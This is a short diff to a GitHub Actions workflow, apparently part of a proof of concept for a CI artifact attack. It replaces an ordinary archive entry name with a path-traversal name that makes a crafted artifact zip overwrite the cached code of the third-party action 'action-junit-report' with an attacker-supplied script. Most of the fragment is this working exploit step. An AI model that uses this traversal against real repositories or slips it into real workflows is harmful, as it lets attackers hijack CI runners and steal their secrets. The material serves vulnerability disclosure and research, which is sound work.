@@ -15,7 +15,7 @@ jobs:
         run: |
           python3 poc/make-artifact.py \
             /tmp/pwnreq-artifact.zip \
-            'safe/payload.js' \
+            'safe/../../../../../_actions/mikepenz/action-junit-report/16a9560bd02f11e7e3bf6b3e2ef6bba6c9d07c32/dist/index.js' \
             poc/overwritten-action.js
       - name: Install artifact protocol client
         run: npm install --no-save @actions/artifact@2.3.2
